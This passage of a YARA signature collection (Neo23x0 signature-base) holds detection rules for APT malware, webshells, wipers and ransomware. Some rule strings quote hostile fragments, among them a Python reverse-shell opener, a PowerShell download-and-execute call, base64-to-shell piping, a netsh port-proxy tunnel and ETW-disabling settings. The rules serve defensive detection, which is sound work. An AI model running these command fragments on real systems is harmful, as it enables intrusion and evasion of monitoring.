		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L91-L107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2dc2ce153d559d795f302f5ca4a9ef9e6e5c54762472e38e6f4a26ef8a28a184"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "c:\\windows\\temp\\tap.tmp"
		$b = "c:\\windows\\temp\\mrteeh.tmp"
		$c = "GenFileName"
		$d = "outfile"
		$e = "[PASTE:%d]"

	condition:
		3 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Powershell_B64Encoded
{
	meta:
		description = "Piece of Base64 encoded data from the XServer PowerShell dropper"
		author = "Fox-IT SRT"
		id = "01e38cfb-b245-5398-b037-6d1d2fb726ee"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L143-L155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "77315f0fc8387fa87892fc8fcea1f6e8a95560049aaa9a87519859020d0a7a3e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header_47000 = "5T39c9u2kr/nr2A0Ny2VKIzkfLRJntuJHafPN/nwWG777rUZDy3BNq8UqSEpx26b"
		$header_25667 = "5T1rc9u2st/zKxjNmZZKFEZyErdJ6nZsx+nxnTjxWGp77mkzHlqCbd5SpIak/Gjr"

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Powershell_Dropper
{
	meta:
		description = "Strings from the PowerShell dropper of XServer"
		author = "Fox-IT SRT"
		id = "97169ab4-d68d-5137-83de-d9cac975747e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L157-L168"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "640c9e52f3cf3df4e954177624e6fba4bab80a2c9442b718fe90e8577dafbbd6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$encfile = "New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encfile)"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Timeliner_Bin
{
	meta:
		description = "Timeliner utility"
		author = "Fox-IT SRT"
		id = "3d81a4ae-0ce0-5867-ac93-a706556481b6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L195-L213"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c3a8cddc34134faaab93ee0df0086604e4a7b031530dd65e2e8dab705483305b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "[+] Work completed." ascii wide
		$b = "[-] Create a new file failed." ascii wide
		$c = "[-] This is not a correct path." ascii wide
		$d = "%s [TargetPath] <Num> <SavePath>" ascii wide
		$e = "D\t%ld\t%ld\t%ld\t%d\t%d\t%s\t" ascii wide
		$f = "D\t%ld\t%ld\t%ld\t-1\t%d\t%s\t" ascii wide
		$g = "%s\t%ld\t%ld\t%ld\t%I64d\t%d\t%s\t%s" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Info_Vbs
{
	meta:
		description = "Strings from the information grabber VBS"
		author = "Fox-IT SRT"
		id = "b719fb31-2836-5faf-a7c8-c361a14df2be"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L297-L316"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e37f8768c7920b8c3d9fdd6bb3a4e748c47a6c06a8aaed01655355ef3d8c3457"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "Logger PingConnect"
		$ = "Logger GetAdmins"
		$ = "Logger InstallPro"
		$ = "Logger Exec"
		$ = "retstr = adminsName & \" Members\" & vbCrLf & _"
		$ = "Logger VolumeName & \" (\" & objDrive.DriveLetter & \":)\" _"
		$ = "txtRes = txtRes & machine & \" can"
		$ = "retstr = \"PID   SID Image Name\" & vbCrLf & \"===="

	condition:
		4 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Console_Jsp
{
	meta:
		description = "Strings from the console.jsp webshell"
		author = "Fox-IT SRT"
		id = "1afdfc34-d2e3-58c7-80ea-ee5632e42469"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L318-L335"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e70c15ef10b63a011edbcedc773a8e2917fd915c3ecc273c3bf2b78eb10fc570"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "String strLogo = request.getParameter(\"image\")"
		$b = "!strLogo.equals(\"web.gif\")"
		$c = "<font color=red>Save Failed!</font>"
		$d = "<font color=red>Save Success!</font>"
		$e = "Save path:<br><input type=text"
		$f = "if (newfile.exists() && newfile.length()>0) { out.println"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Index_Jsp
{
	meta:
		description = "Strings from the index.jsp socket tunnel"
		author = "Fox-IT SRT"
		id = "9c226ccd-6c69-523c-bca4-371e55274667"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L337-L353"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "870dad9fb5456f8edbd9f3c2d0b8764cf1143399626ce4df53c93919bcb1a0cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "X-CMD"
		$x2 = "X-STATUS"
		$x3 = "X-TARGET"
		$x4 = "X-ERROR"
		$a = "out.print(\"All seems fine.\");"

	condition:
		all of ( $x* ) and $a
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Webinfo
{
	meta:
		description = "Generic strings from webinfo.war webshells"
		author = "Fox-IT SRT"
		id = "b8477f62-f3f6-5526-b0e3-9b794fefaa1f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L374-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "711737a56067f24f422cc7d5aeba4389741fe18a0e66f2715fce626c3b6aef19"
		score = 75
		quality = 85
		tags = ""

	strings:
		$var1 = "String strLogo = request.getParameter"
		$var2 = "String content = request.getParameter(\"content\");"
		$var3 = "String basePath=request.getScheme()"
		$var4 = "!strLogo.equals("
		$var5 = "if(path!=null && !path.equals(\"\") && content!=null"
		$var6 = "File newfile=new File(path);"
		$str1 = "Save Success!"
		$str2 = "Save Failed!"

	condition:
		2 of ( $var* ) or ( all of ( $str* ) and 1 of ( $var* ) )
}

rule SIGNATURE_BASE_APT_Crywiper_Dec22
{
	meta:
		description = "Detects CryWiper malware samples"
		author = "Florian Roth (Nextron Systems)"
		id = "d56ccf4e-30ba-5308-ad68-ffc2ae5a1718"
		date = "2022-12-05"
		modified = "2023-12-05"
		reference = "https://securelist-ru.translate.goog/novyj-troyanec-crywiper/106114/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ru_crywiper.yar#L2-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7c22e02ed996cd820ed87a0c5d50e3264629cdd887aad4ea466cadeccaee2b2f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "Software\\Sysinternals\\BrowserUpdate"
		$sx1 = "taskkill.exe /f /im MSExchange*"
		$s1 = "SYSTEM\\CurrentControlSet\\Control\\Terminal Server" ascii
		$s2 = "fDenyTSConnections" ascii

	condition:
		1 of ( $x* ) or all of ( $s* )
}

rule SIGNATURE_BASE_Connectwise_Screenconnect_Authentication_Bypass_Feb_2024_Exploitation_IIS_Logs
{
	meta:
		description = "Detects an http request to '/SetupWizard.aspx/' with anything following it, which when found in IIS logs is a potential indicator of compromise of the 2024 ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability that allows an Authentication Bypass"
		author = "Huntress DE&TH Team (modified by Florian Roth)"
		id = "2886530b-e164-4c4b-b01e-950e3c40acb4"
		date = "2024-02-20"
		modified = "2024-02-21"
		reference = "https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L3-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f6c7a3aa2ed98e754f9523c55eb035c7bc5f8aea96a6f86c729e9658d78710fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " GET /SetupWizard.aspx/" ascii
		$s2 = " POST /SetupWizard.aspx/" ascii
		$s3 = " PUT /SetupWizard.aspx/" ascii
		$s4 = " HEAD /SetupWizard.aspx/" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lockbit_Ransomnote_Feb24
{
	meta:
		description = "Detects the LockBit ransom note file 'LockBit-DECRYPT.txt' which is a sign of a LockBit ransomware infection"
		author = "Florian Roth"
		id = "b2fcb2a7-49e8-520c-944f-6acd5ded579b"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L137-L149"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "1fe07c33de1971b1f9430851dec4b8cd9f3ac7f087f0de18a2da4a390891b674"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = ">>>> Your personal DECRYPTION ID:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lazy_Ransomnote_Feb24
{
	meta:
		description = "Detects the Lazy ransom note file 'HowToRestoreYourFiles.txt' which is a sign of a Lazy ransomware infection"
		author = "Florian Roth"
		id = "287dfd67-8d0d-5906-b593-3af42a5a3aa4"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L151-L163"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c9416d05f0bd9aab9d6108380c1b5364f4c4e112b6e0726202f083eaacfdcf56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "All Encrypted files can be reversed to original form and become usable"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_PY_Import_Statement_Apr24_1
{
	meta:
		description = "Detects suspicious Python import statement and socket usage often found in Python reverse shells"
		author = "Florian Roth"
		id = "8e05f9a1-40a8-5d01-9e45-8779b0ff7a45"
		date = "2024-04-15"
		modified = "2025-03-21"
		reference = "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_paloalto_cve_2024_3400_apr24.yar#L67-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d5c199d9c3e449ca282f0ca91c94ac783709299b3489f7cec38177a2f843b504"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = "import sys,socket,os,pty;s=socket.socket("

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_PY_Dimorf
{
	meta:
		description = "Detection for Dimorf ransomeware"
		author = "Silas Cutler"
		id = "78b53433-6926-58cd-8ec0-2195af803aab"
		date = "2023-01-03"
		modified = "2023-12-05"
		reference = "https://github.com/Ort0x36/Dimorf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_100days_of_yara_2023.yar#L224-L242"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7499b21f77d07364983b94134a60f7c99e71a5392386437d459a196bf71852fb"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$func01 = "def find_and_encrypt"
		$func02 = "def check_os"
		$comment01 = "checks if the user has permission on the file."
		$misc01 = "log_dimorf.log"
		$misc02 = ".dimorf"

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_NK_MAL_M_Hunting_POOLRAT
{
	meta:
		description = "Detects strings found in POOLRAT malware"
		author = "Mandiant"
		id = "70f5f3a0-0fd0-54dc-97cc-4f3c35f02fcd"
		date = "2023-04-20"
		modified = "2023-12-05"
		old_rule_name = "APT_NK_MAL_M_Hunting_POOLRAT"
		reference = "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_tradingtech_apr23.yar#L166-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ac8db844a9c4ed961930417809afb706ea948c4509a4be1eaeed77f09c86069d"
		score = 70
		quality = 83
		tags = ""
		disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
		hash1 = "451c23709ecd5a8461ad060f6346930c"

	strings:
		$s1 = "name=\"uid\"%s%s%u%s" ascii wide
		$s2 = "name=\"session\"%s%s%u%s" ascii wide
		$s3 = "name=\"action\"%s%s%s%s" ascii wide
		$s4 = "name=\"token\"%s%s%u%s" ascii wide
		$str1 = "--N9dLfqxHNUUw8qaUPqggVTpX-" wide ascii nocase

	condition:
		any of ( $s* ) or $str1
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Kaosrat_Yamabot
{
	meta:
		description = "Detects the KaosRAT variant"
		author = "CISA.gov"
		id = "cdde69cd-1b38-52f5-8552-cef2cf4ad69c"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_andariel_jul24.yar#L20-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "92182aac2e56041292102b0486b7de1ee6eb3d54a9fc6786c567acd92073cd84"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "/kaos/"
		$str2 = "Abstand ["
		$str3 = "] anwenden"
		$str4 = "cmVjYXB0Y2hh"
		$str5 = "/bin/sh"
		$str6 = "utilities.CIpaddress"
		$str7 = "engine.NewEgg"
		$str8 = "%s%04x%s%s%s"
		$str9 = "Y2FwdGNoYV9zZXNzaW9u"
		$str10 = "utilities.EierKochen"
		$str11 = "kandidatKaufhaus"

	condition:
		3 of them
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Golang_Validalpha_Tasks
{
	meta:
		description = "Detects a variant of the GoLang Validalpha malware"
		author = "CISA.gov"
		id = "caa67a79-3ea6-5910-971c-f311722570ff"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_andariel_jul24.yar#L232-L247"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0d3fb944888b289d345ffc8dfcc988abd04b8cabd1729a66e8236f95ee6147ee"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "main.ScreenMonitThread"
		$ = "main.CmdShell"
		$ = "main.GetAllFoldersAndFiles"
		$ = "main.SelfDelete"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_Hawkeye_Keylogger_Gen_Dec18
{
	meta:
		description = "Detects HawkEye Keylogger Reborn"
		author = "Florian Roth (Nextron Systems)"
		id = "1d06f364-a4e2-5632-ad3a-d53a8cddf072"
		date = "2018-12-10"
		modified = "2023-12-05"
		reference = "https://twitter.com/James_inthe_box/status/1072116224652324870"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_hawkeye.yar#L20-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b850f02849030d9912b7571e33e969427ac8f721d2f288ae3ac3e971c4ee4263"
		score = 75
		quality = 85
		tags = ""
		hash1 = "b8693e015660d7bd791356b352789b43bf932793457d54beae351cf7a3de4dad"

	strings:
		$s1 = "HawkEye Keylogger" fullword wide
		$s2 = "_ScreenshotLogger" ascii
		$s3 = "_PasswordStealer" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_APT_RANSOM_Lockbit_Forensicartifacts_Nov23
{
	meta:
		description = "Detects patterns found in Lockbit TA attacks exploiting Citrixbleed vulnerability CVE 2023-4966"
		author = "Florian Roth"
		id = "04bde599-2a5b-5a33-a6f1-67d57a564946"
		date = "2023-11-22"
		modified = "2023-12-05"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ransom_lockbit_citrixbleed_nov23.yar#L73-L86"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6ba1d47e2cac72143c4612c420777024f114afc007c7b15251a58819654aeff1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "taskkill /f /im sqlwriter.exe /im winmysqladmin.exe /im w3sqlmgr.exe"
		$x2 = " 1> \\\\127.0.0.1\\admin$\\__"

	condition:
		1 of ( $x* )
}

rule SIGNATURE_BASE_APT_APT28_Drovorub_Unique_Network_Comms_Strings
{
	meta:
		description = "Rule to detect Drovorub-server, Drovorub-agent, or Drovorub-client based"
		author = "NSA / FBI"
		id = "c6a930e8-c1c0-5d96-9051-7516df848b45"
		date = "2020-08-13"
		modified = "2023-12-05"
		reference = "https://www.nsa.gov/news-features/press-room/Article/2311407/nsa-and-fbi-expose-russian-previously-undisclosed-malware-drovorub-in-cybersecu/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_apt28_drovorub.yar#L44-L72"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8c82766b76c36fe64c6aa99577e1997d7181dbd36a4c27329845ae8a413f5327"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s_01 = "action" wide ascii
		$s_02 = "auth.commit" wide ascii
		$s_03 = "auth.hello" wide ascii
		$s_04 = "auth.login" wide ascii
		$s_05 = "auth.pending" wide ascii
		$s_06 = "client_id" wide ascii
		$s_07 = "client_login" wide ascii
		$s_08 = "client_pass" wide ascii
		$s_09 = "clientid" wide ascii
		$s_10 = "clientkey_base64" wide ascii
		$s_11 = "file_list_request" wide ascii
		$s_12 = "module_list_request" wide ascii
		$s_13 = "monitor" wide ascii
		$s_14 = "net_list_request" wide ascii
		$s_15 = "server finished" wide ascii
		$s_16 = "serverid" wide ascii
		$s_17 = "tunnel" wide ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_Script_Obfuscation_Char_Concat
{
	meta:
		description = "Detects strings found in sample from CN group repo leak in October 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "6d3bfdfd-ef8f-5740-ac1f-5835c7ce0f43"
		date = "2018-10-04"
		modified = "2025-03-21"
		reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L188-L200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "28b648e0e1c22fefa49a937f40bd4ed09c5d3894ff059979bad69e8bc98fcac2"
		score = 65
		quality = 85
		tags = ""
		hash1 = "b30cc10e915a23c7273f0838297e0d2c9f4fc0ac1f56100eef6479c9d036c12b"

	strings:
		$s1 = "\"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Powershell_IEX_Download_Combo
{
	meta:
		description = "Detects strings found in sample from CN group repo leak in October 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "1dfedcb0-345c-548c-85ac-3c1e78bfd9e2"
		date = "2018-10-04"
		modified = "2025-03-21"
		reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L202-L218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0a1507859354e0e0d9284befcf777c4d3883496eb96524a246a1df4f3a247aa9"
		score = 65
		quality = 85
		tags = ""
		hash1 = "13297f64a5f4dd9b08922c18ab100d3a3e6fdeab82f60a4653ab975b8ce393d5"

	strings:
		$x1 = "IEX ((new-object net.webclient).download" ascii nocase
		$fp1 = "chocolatey.org"
		$fp2 = "Remote Desktop in the Appveyor"
		$fp3 = "/appveyor/" ascii

	condition:
		$x1 and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_SUSP_Netsh_Portproxy_Command
{
	meta:
		description = "Detects a suspicious command line with netsh and the portproxy command"
		author = "Florian Roth (Nextron Systems)"
		id = "cbbd2042-572c-5283-bd45-e745b36733ad"
		date = "2019-04-20"
		modified = "2025-03-21"
		reference = "https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L295-L308"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "dbf82a908e77886af1c31c51f5f6684015cbcb22bf28876c2e1b0dd1ea5bd2b4"
		score = 65
		quality = 85
		tags = ""
		hash1 = "9b33a03e336d0d02750a75efa1b9b6b2ab78b00174582a9b2cb09cd828baea09"

	strings:
		$x1 = "netsh interface portproxy add v4tov4 listenport=" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Disable_ETW_Jun20_1
{
	meta:
		description = "Detects method to disable ETW in ENV vars before executing a program"
		author = "Florian Roth (Nextron Systems)"
		id = "ea5dee09-959e-5ef2-8f84-5497bdef0a05"
		date = "2020-06-06"
		modified = "2025-03-21"
		reference = "https://gist.github.com/Cyb3rWard0g/a4a115fd3ab518a0e593525a379adee3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_suspicious_strings.yar#L395-L413"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "182ad2512bcfbcd92d13380113b32982eb367e458019f07038a12f494dfbebb6"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = "set COMPlus_ETWEnabled=0" ascii wide fullword
		$x2 = "$env:COMPlus_ETWEnabled=0" ascii wide fullword
		$s1 = "Software\\Microsoft.NETFramework" ascii wide
		$sa1 = "/v ETWEnabled" ascii wide fullword
		$sa2 = " /d 0" ascii wide
		$sb4 = "-Name ETWEnabled"
		$sb5 = " -Value 0 "

	condition:
		1 of ( $x* ) or 3 of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_SKIPJACK_1
{
	meta:
		description = "Hunting rule looking for strings observed in SKIPJACK installation script."
		author = "Mandiant"
		id = "0026375c-7f37-5ef9-bd55-5b9fc499e5d2"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L175-L193"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e4e86c273a2b67a605f5d4686783e0cc"
		logic_hash = "8890cd9ab8190f12997e0653e43c89816df03c7bd41842e5ad21b1986819843e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "hdr:name() == 'Content-ID'" base64
		$str2 = "hdr:body() ~= nil" base64
		$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")" base64
		$str4 = "openssl aes-256-cbc" base64
		$str5 = "mod_content.lua"
		$str6 = "#!/bin/sh"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_Lua_SKIPJACK_2
{
	meta:
		description = "Hunting rule looking for strings observed in SKIPJACK samples."
		author = "Mandiant"
		id = "e1eac294-fe60-5bb2-bae4-0f7bcbe6b1db"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L195-L212"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "87847445f9524671022d70f2a812728f"
		logic_hash = "093e8857c410bd30a076f87ef63d7e1e66f50e3dce75b4add67161782386ee24"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "hdr:name() == 'Content-ID'"
		$str2 = "hdr:body() ~= nil"
		$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")"
		$str4 = "openssl aes-256-cbc"
		$str5 = "| base64 -d| sh 2>"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_Lua_SEASPRAY_1
{
	meta:
		description = "Hunting rule looking for strings observed in SEASPRAY samples."
		author = "Mandiant"
		id = "8c744b85-b61e-56d0-8a9e-ae6a954e1b95"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_barracuda_esg_unc4841_jun23.yar#L213-L228"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "35cf6faf442d325961935f660e2ab5a0"
		logic_hash = "856bfb47557b60f69aa1141477d6ce446ea13ebbe899022d7996ceef08bdefbb"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "string.find(attachment:filename(),'obt075') ~= nil"
		$str2 = "os.execute('cp '..tostring(tmpfile)..' /tmp/'..attachment:filename())"
		$str3 = "os.execute('rverify'..' /tmp/'..attachment:filename())"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_UA_Hermetic_Wiper_Artefacts_Feb22_1
{
	meta:
		description = "Detects artefacts found in Hermetic Wiper malware related intrusions"
		author = "Florian Roth (Nextron Systems)"
